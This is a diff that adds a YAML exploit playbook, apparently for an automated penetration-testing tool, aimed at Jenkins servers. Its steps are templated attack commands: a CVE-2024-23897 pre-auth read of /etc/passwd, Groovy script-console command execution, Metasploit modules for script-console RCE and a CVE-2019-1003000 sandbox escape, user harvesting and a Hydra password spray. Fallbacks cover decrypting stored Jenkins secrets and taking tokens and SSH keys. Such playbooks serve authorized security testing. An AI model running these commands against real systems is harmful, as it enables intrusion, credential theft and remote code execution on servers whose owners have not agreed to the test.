@@ -1,0 +1,45 @@
+id: tech_jenkins
+title: "Jenkins — script console + CVE-2024-23897 file read + auth bypass"
+phase: exploit
+mitre: ["T1190", "T1059.001"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443, 50000]
+  technologies: ["jenkins", "x-jenkins", "/jenkins/", "hudson"]
+  cves:     ["CVE-2018-1000861", "CVE-2024-23897", "CVE-2017-1000353", "CVE-2019-1003000"]
+keywords: ["jenkins", "groovy script console", "jenkins rce", "hudson"]
+preconditions:
+  - "Jenkins web UI reachable (X-Jenkins header, /login title)"
+steps:
+  - tool: curl
+    cmd:  "curl -s -I {base_url}/login | grep -i x-jenkins"
+    why:  "Version disclosure via X-Jenkins header"
+  - tool: curl
+    cmd:  "curl -s {base_url}/asynchPeople/ | head -c 500; curl -s {base_url}/securityRealm/user/admin/"
+    why:  "Anonymous user list — common when global Jenkins.READ granted to anon"
+  - tool: jenkins-cli
+    cmd:  "java -jar jenkins-cli.jar -s {base_url}/ -webSocket connect-node @/etc/passwd"
+    why:  "CVE-2024-23897 — pre-auth arbitrary file read via @file argument resolution (Jenkins ≤2.441 / LTS ≤2.426.2)"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/script' -d 'script=println(\"id\".execute().text)' --data-urlencode 'Submit=Run' -b 'JSESSIONID={session}'"
+    why:  "Groovy script console RCE — admin-required but check anon access first"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/jenkins_script_console; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Automated script console RCE post-cred"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/jenkins_metaprogramming; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "CVE-2019-1003000 unauth Groovy sandbox escape (older Jenkins)"
+  - tool: curl
+    cmd:  "curl -s {base_url}/asynchPeople/api/json | jq '.users[].user.fullName'"
+    why:  "Username harvest for cred spray"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/j_spring_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid'"
+    why:  "Login spray — Jenkins lockout policy is often disabled"
+expected_outcome: "Groovy RCE as jenkins user; arbitrary file read on CVE-2024-23897 (creds, secrets.key)"
+fallbacks:
+  - "Decrypt Jenkins secrets (./secrets/master.key + secrets/hudson.util.Secret) for stored creds"
+  - "Build workspace often has API tokens / SSH keys — `ls -la /var/jenkins_home/jobs/*/workspace/`"
+  - "Slave nodes (50000) — JNLP without auth in some configs"
+references:
+  - "https://www.jenkins.io/security/advisories/"
+  - "https://github.com/jenkinsci-cert/SECURITY-3314-3315"
